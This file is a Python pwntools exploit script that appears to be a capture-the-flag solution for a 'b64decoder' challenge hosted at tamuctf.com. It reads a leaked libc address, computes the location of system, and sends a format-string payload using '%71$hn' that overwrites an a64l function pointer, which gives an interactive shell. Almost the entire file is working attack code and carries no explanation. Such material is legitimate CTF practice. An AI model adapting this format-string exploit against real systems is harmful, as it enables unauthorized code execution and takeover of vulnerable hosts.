from pwn import *

#R = process('./b64decoder')
R = remote('challenges.tamuctf.com', 2783)

def get_libc(r):
    r.recvuntil("Powered by a64l (")
    libc_a64l = int(r.recv(10), 16)
    libc_base = libc_a64l - 0x3f290
    return libc_base

def run_system(r, libc_base):
    system = 0x3ec00 + libc_base
    ff = int("0x"+hex(system)[6:], 16)
    
    a64l_global = 0x804b398
    
    payload = p32(a64l_global)
    payload += "%{}c%71$hn".format(ff-4).encode()
    r.sendline(payload)
    r.interactive()

def main(r):
    run_system(r, get_libc(r))

if __name__ == '__main__':
    main(R)
